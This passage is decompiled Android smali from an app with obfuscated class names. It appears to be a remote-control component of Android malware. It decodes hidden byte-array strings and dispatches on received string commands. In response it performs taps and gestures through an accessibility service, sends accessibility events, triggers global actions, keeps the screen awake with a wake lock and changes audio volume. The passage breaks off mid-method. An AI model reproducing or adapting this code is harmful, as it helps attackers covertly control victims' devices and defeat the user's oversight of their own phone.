    invoke-virtual {v0, v1}, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->A(I)V

    goto :goto_1

    :cond_3
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_4

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityWindowInfo;

    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityWindowInfo;->getId()I

    move-result v2

    invoke-virtual {v0, v2}, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->A(I)V

    goto :goto_0

    :cond_4
    :goto_1
    return-void
.end method

.method public static p(Ljava/lang/String;Ljava/lang/String;)V
    .locals 11

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->K()Landroid/content/Context;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->J()Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    move-result-object v1

    if-nez v1, :cond_1

    return-void

    :cond_1
    invoke-virtual {p0}, Ljava/lang/String;->hashCode()I

    move-result v2

    const/4 v3, 0x3

    const/4 v4, 0x2

    const/4 v5, 0x5

    const/4 v6, 0x1

    const/4 v7, 0x4

    const/4 v8, 0x0

    const/4 v9, 0x6

    const/16 v10, 0x8

    sparse-switch v2, :sswitch_data_0

    goto/16 :goto_0

    :sswitch_0
    new-array v2, v5, [B

    fill-array-data v2, :array_0

    new-array v5, v10, [B

    fill-array-data v5, :array_1

    invoke-static {v2, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_2

    move p0, v8

    goto :goto_1

    :sswitch_1
    new-array v2, v5, [B

    fill-array-data v2, :array_2

    new-array v5, v10, [B

    fill-array-data v5, :array_3

    invoke-static {v2, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_2

    move p0, v7

    goto :goto_1

    :sswitch_2
    new-array v2, v7, [B

    fill-array-data v2, :array_4

    new-array v5, v10, [B

    fill-array-data v5, :array_5

    invoke-static {v2, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_2

    move p0, v4

    goto :goto_1

    :sswitch_3
    new-array v2, v9, [B

    fill-array-data v2, :array_6

    new-array v5, v10, [B

    fill-array-data v5, :array_7

    invoke-static {v2, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_2

    move p0, v3

    goto :goto_1

    :sswitch_4
    new-array v2, v9, [B

    fill-array-data v2, :array_8

    new-array v5, v10, [B

    fill-array-data v5, :array_9

    invoke-static {v2, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_2

    move p0, v6

    goto :goto_1

    :cond_2
    :goto_0
    const/4 p0, -0x1

    :goto_1
    if-eqz p0, :cond_d

    if-eq p0, v6, :cond_b

    if-eq p0, v4, :cond_9

    if-eq p0, v3, :cond_8

    if-eq p0, v7, :cond_3

    goto/16 :goto_3

    :cond_3
    invoke-static {p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->h(Ljava/lang/String;)Ljava/util/LinkedHashMap;

    move-result-object p0

    if-nez p0, :cond_4

    return-void

    :cond_4
    :try_start_0
    invoke-virtual {p0}, Ljava/util/AbstractMap;->size()I

    move-result p1

    if-lez p1, :cond_e

    invoke-virtual {p0}, Ljava/util/LinkedHashMap;->keySet()Ljava/util/Set;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object p1

    :cond_5
    :goto_2
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_7

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    const-wide/16 v1, 0x7d0

    :try_start_1
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_0
    :try_start_2
    invoke-virtual {p0, v0}, Ljava/util/LinkedHashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, [Landroid/graphics/Point;

    new-array v2, v6, [B

    const/16 v3, 0x45

    aput-byte v3, v2, v8

    new-array v3, v10, [B

    fill-array-data v3, :array_a

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_6

    aget-object v0, v1, v8

    iget v1, v0, Landroid/graphics/Point;->x:I

    iget v0, v0, Landroid/graphics/Point;->y:I

    invoke-static {v1, v0}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->z(II)Z

    goto :goto_2

    :cond_6
    new-array v2, v6, [B

    const/16 v3, -0x5f

    aput-byte v3, v2, v8

    new-array v3, v10, [B

    fill-array-data v3, :array_b

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_5

    const/16 v0, 0x3e8

    invoke-static {v1, v0}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->I([Landroid/graphics/Point;I)V

    goto :goto_2

    :cond_7
    invoke-virtual {p0}, Ljava/util/LinkedHashMap;->clear()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto/16 :goto_3

    :cond_8
    invoke-static {p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->c(Ljava/lang/String;)V

    goto/16 :goto_3

    :cond_9
    new-instance p0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object p1

    invoke-direct {p0, p1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance p1, Lcom/vknnolqo/p9sv5zvf/MtokN1ft$d;

    invoke-direct {p1, v1}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft$d;-><init>(Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V

    invoke-virtual {p0, p1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    sget-object p0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->x:Ljava/lang/Boolean;

    invoke-virtual {p0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p0

    if-eqz p0, :cond_a

    new-array p0, v9, [B

    fill-array-data p0, :array_c

    new-array p1, v10, [B

    fill-array-data p1, :array_d

    invoke-static {p0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    new-array p1, v7, [B

    fill-array-data p1, :array_e

    new-array v1, v10, [B

    fill-array-data v1, :array_f

    invoke-static {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    sget-object p1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->v:Ljava/util/LinkedHashMap;

    invoke-static {v0, p0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->i(Landroid/content/Context;Ljava/lang/String;Ljava/util/LinkedHashMap;)V

    new-array p0, v9, [B

    fill-array-data p0, :array_10

    new-array p1, v10, [B

    fill-array-data p1, :array_11

    invoke-static {p0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    const-string p1, ""

    invoke-static {v0, p0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_a
    sget-object p0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    sput-object p0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->x:Ljava/lang/Boolean;

    sget-object p0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->v:Ljava/util/LinkedHashMap;

    invoke-virtual {p0}, Ljava/util/LinkedHashMap;->clear()V

    goto :goto_3

    :cond_b
    sget-object p0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->x:Ljava/lang/Boolean;

    invoke-virtual {p0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p0

    if-eqz p0, :cond_c

    return-void

    :cond_c
    sget-object p0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    sput-object p0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->x:Ljava/lang/Boolean;

    new-array p0, v9, [B

    fill-array-data p0, :array_12

    new-array v1, v10, [B

    fill-array-data v1, :array_13

    invoke-static {p0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-static {v0, p0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_3

    :cond_d
    new-instance p0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object p1

    invoke-direct {p0, p1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance p1, Lcom/vknnolqo/p9sv5zvf/MtokN1ft$c;

    invoke-direct {p1, v1}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft$c;-><init>(Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V

    invoke-virtual {p0, p1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :catch_1
    :cond_e
    :goto_3
    return-void

    nop

    :sswitch_data_0
    .sparse-switch
        -0x6e54a78f -> :sswitch_4
        -0x6e501b5c -> :sswitch_3
        0x277c22 -> :sswitch_2
        0x4b321ec -> :sswitch_1
        0x4c7d442 -> :sswitch_0
    .end sparse-switch

    :array_0
    .array-data 1
        -0xct
        -0x1ct
        -0x2ct
        0x44t
        -0xft
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x59t
        -0x70t
        -0x4bt
        0x36t
        -0x7bt
        -0x29t
        -0x2at
        0x6dt
    .end array-data

    :array_2
    .array-data 1
        -0x1ft
        -0x21t
        -0x4t
        -0x50t
        -0x40t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x4dt
        -0x46t
        -0x74t
        -0x2bt
        -0x4ct
        -0x24t
        0x35t
        -0x37t
    .end array-data

    :array_4
    .array-data 1
        0x1ct
        0x7et
        0x3et
        -0x2dt
    .end array-data

    :array_5
    .array-data 1
        0x4ft
        0xat
        0x51t
        -0x5dt
        0x64t
        0x35t
        0x1bt
        -0x16t
    .end array-data

    :array_6
    .array-data 1
        -0x1t
        0x16t
        -0x58t
        0x24t
        -0x34t
        -0x39t
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x53t
        0x73t
        -0x3bt
        0x4bt
        -0x46t
        -0x5et
        -0x80t
        0x45t
    .end array-data

    :array_8
    .array-data 1
        -0x58t
        0x59t
        -0x5bt
        -0x58t
        0x46t
        0xft
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x6t
        0x3ct
        -0x3at
        -0x39t
        0x34t
        0x6bt
        0x5ft
        -0x4dt
    .end array-data

    :array_a
    .array-data 1
        0x6t
        -0x80t
        -0x77t
        -0x26t
        -0x4et
        -0x80t
        0x3et
        -0x22t
    .end array-data

    :array_b
    .array-data 1
        -0xet
        -0x23t
        0x67t
        0x64t
        0x67t
        0x15t
        0x66t
        -0x35t
    .end array-data

    :array_c
    .array-data 1
        0x2t
        -0x7t
        -0x22t
        0x72t
        0x25t
        0x3t
    .end array-data

    nop

    :array_d
    .array-data 1
        0x50t
        -0x64t
        -0x43t
        0x3ct
        0x44t
        0x6et
        0x1ct
        -0x1at
    .end array-data

    :array_e
    .array-data 1
        0x7ft
        0x35t
        -0xdt
        -0x73t
    .end array-data

    :array_f
    .array-data 1
        0x2dt
        0x50t
        -0x70t
        -0x44t
        0x47t
        0x58t
        0x56t
        -0x23t
    .end array-data

    :array_10
    .array-data 1
        -0x6dt
        -0x2t
        -0x11t
        -0x5dt
        -0x1bt
        -0x62t
    .end array-data

    nop

    :array_11
    .array-data 1
        -0x3ft
        -0x65t
        -0x74t
        -0x13t
        -0x7ct
        -0xdt
        0x7ct
        -0x6dt
    .end array-data

    :array_12
    .array-data 1
        0x1dt
        -0x1dt
        0x52t
        -0x2t
        0x3ct
        0x57t
    .end array-data

    nop

    :array_13
    .array-data 1
        0x4ft
        -0x7at
        0x31t
        -0x50t
        0x5dt
        0x3at
        0x74t
        0x1et
    .end array-data
.end method

.method public static q(Ljava/lang/String;[Ljava/lang/String;)V
    .locals 5

    .line 1
    const-string v0, ""

    :try_start_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->J()Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    move-result-object v1

    if-nez v1, :cond_0

    return-void

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->K()Landroid/content/Context;

    move-result-object v2

    if-nez v2, :cond_1

    return-void

    :cond_1
    if-eqz p1, :cond_3

    const/4 v3, 0x0

    aget-object v3, p1, v3

    const/4 v4, 0x1

    aget-object p1, p1, v4

    sget-object v4, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->Y:Ljava/util/HashMap;

    invoke-virtual {v4, v0}, Ljava/util/HashMap;->containsKey(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_2

    sget-object v4, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->Y:Ljava/util/HashMap;

    invoke-virtual {v4, v0}, Ljava/util/HashMap;->containsValue(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_3

    goto :goto_0

    :catch_0
    move-exception p0

    goto :goto_1

    :cond_2
    :goto_0
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->Y:Ljava/util/HashMap;

    invoke-virtual {v0, v3, p1}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    :cond_3
    const/16 p1, 0xd

    new-array p1, p1, [B

    fill-array-data p1, :array_0

    const/16 v0, 0x8

    new-array v0, v0, [B

    fill-array-data v0, :array_1

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/view/accessibility/AccessibilityManager;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityManager;->isEnabled()Z

    move-result v0

    if-eqz v0, :cond_4

    invoke-static {}, Landroid/view/accessibility/AccessibilityEvent;->obtain()Landroid/view/accessibility/AccessibilityEvent;

    move-result-object v0

    const/16 v3, 0x4000

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityEvent;->setEventType(I)V

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityRecord;->setClassName(Ljava/lang/CharSequence;)V

    invoke-virtual {v2}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityEvent;->setPackageName(Ljava/lang/CharSequence;)V

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v1

    invoke-interface {v1, p0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    invoke-virtual {p1, v0}, Landroid/view/accessibility/AccessibilityManager;->sendAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :goto_1
    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_4
    :goto_2
    return-void

    :array_0
    .array-data 1
        -0x6et
        -0x1at
        -0x34t
        0xdt
        0x57t
        0x65t
        -0x2et
        0xdt
        -0x66t
        -0x17t
        -0x3at
        0x1ct
        0x5dt
    .end array-data

    nop

    :array_1
    .array-data 1
        -0xdt
        -0x7bt
        -0x51t
        0x68t
        0x24t
        0x16t
        -0x45t
        0x6ft
    .end array-data
.end method

.method public static r()V
    .locals 4

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->K()Landroid/content/Context;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->J()Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    move-result-object v0

    if-nez v0, :cond_1

    return-void

    :cond_1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v1

    const/4 v2, 0x3

    if-eq v1, v2, :cond_3

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v1

    const/4 v3, 0x6

    if-ne v1, v3, :cond_2

    goto :goto_0

    :cond_2
    sget-object v1, Lcom/vknnolqo/p9sv5zvf/GBPjHfKu;->j:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v1, v2}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto :goto_1

    :cond_3
    :goto_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->Q()V

    :goto_1
    const-wide/16 v1, 0x3e8

    :try_start_0
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    invoke-virtual {v0}, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->m()V

    return-void
.end method

.method public static s(Ljava/lang/String;)V
    .locals 3

    .line 1
    const/16 v0, 0x8

    new-array v1, v0, [B

    fill-array-data v1, :array_0

    new-array v2, v0, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x6

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v0, v0, [B

    fill-array-data v0, :array_3

    invoke-static {v2, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    filled-new-array {v0, p0}, [Ljava/lang/String;

    move-result-object p0

    invoke-static {v1, p0}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->q(Ljava/lang/String;[Ljava/lang/String;)V

    return-void

    nop

    :array_0
    .array-data 1
        -0x61t
        0x6ft
        0x5ct
        0x46t
        0x43t
        -0x11t
        0x30t
        -0x3at
    .end array-data

    :array_1
    .array-data 1
        -0x3t
        0x3t
        0x3dt
        0x25t
        0x28t
        -0x7et
        0x43t
        -0x5ft
    .end array-data

    :array_2
    .array-data 1
        -0x5et
        0x64t
        -0x29t
        0x3t
        -0x4at
        -0x31t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x14t
        0x1t
        -0x60t
        0x4et
        -0x3bt
        -0x58t
        0x14t
        0x59t
    .end array-data
.end method

.method public static t(Landroid/content/Context;)V
    .locals 4

    .line 1
    if-nez p0, :cond_0

    :try_start_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->K()Landroid/content/Context;

    move-result-object p0

    goto :goto_0

    :catch_0
    move-exception p0

    goto :goto_1

    :cond_0
    :goto_0
    if-nez p0, :cond_1

    return-void

    :cond_1
    const/4 v0, 0x5

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/os/PowerManager;

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->f:Landroid/os/PowerManager$WakeLock;

    if-nez v0, :cond_2

    const/4 v0, 0x1

    new-array v0, v0, [B

    const/4 v2, 0x0

    const/16 v3, -0x4a

    aput-byte v3, v0, v2

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const v1, 0x3000001a

    invoke-virtual {p0, v1, v0}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object p0

    sput-object p0, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->f:Landroid/os/PowerManager$WakeLock;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_2
    :try_start_1
    sget-object p0, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->f:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {p0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result p0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    if-eqz p0, :cond_3

    return-void

    :catch_1
    :cond_3
    :try_start_2
    new-instance p0, Ljava/lang/Thread;

    new-instance v0, Lcom/vknnolqo/p9sv5zvf/MtokN1ft$b;

    invoke-direct {v0}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft$b;-><init>()V

    invoke-direct {p0, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {p0}, Ljava/lang/Thread;->start()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_2

    :goto_1
    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_2
    return-void

    :array_0
    .array-data 1
        -0x26t
        0x4t
        -0x52t
        0x2ft
        -0x16t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x56t
        0x6bt
        -0x27t
        0x4at
        -0x68t
        -0x8t
        -0x7dt
        -0x63t
    .end array-data

    :array_2
    .array-data 1
        -0x74t
        0x10t
        0x46t
        0xbt
        0x4ct
        -0x74t
        0x16t
        0x16t
    .end array-data
.end method

.method static synthetic u()Landroid/os/PowerManager$WakeLock;
    .locals 1

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->f:Landroid/os/PowerManager$WakeLock;

    return-object v0
.end method

.method public static v(Z)V
    .locals 5

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->J()Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    const/4 v1, 0x5

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v3, v3, [B

    fill-array-data v3, :array_1

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/AudioManager;

    if-eqz v0, :cond_2

    const/4 v2, 0x1

    if-eqz p0, :cond_1

    move p0, v2

    goto :goto_0

    :cond_1
    const/4 p0, -0x1

    :goto_0
    const/4 v3, 0x3

    const/4 v4, 0x0

    invoke-virtual {v0, v3, p0, v4}, Landroid/media/AudioManager;->adjustStreamVolume(III)V

    const/4 v3, 0x2

    invoke-virtual {v0, v3, p0, v2}, Landroid/media/AudioManager;->adjustStreamVolume(III)V

    invoke-virtual {v0, v2, p0, v4}, Landroid/media/AudioManager;->adjustStreamVolume(III)V

    invoke-virtual {v0, v1, p0, v4}, Landroid/media/AudioManager;->adjustStreamVolume(III)V

    :cond_2
    return-void

    :array_0
    .array-data 1
        0x5ct
        0x31t
        -0x65t
        0x64t
        -0x5et
    .end array-data

    nop

    :array_1
    .array-data 1
        0x3dt
        0x44t
        -0x1t
        0xdt
        -0x33t
        -0x2ct
        -0x1et
        -0x7t
    .end array-data
.end method

.method public static w(Landroid/accessibilityservice/AccessibilityService;)V
    .locals 3

    .line 1
    const/4 v0, 0x0

    :goto_0
    const/4 v1, 0x3

    if-ge v0, v1, :cond_0

    const/4 v1, 0x1

    :try_start_0
    invoke-virtual {p0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
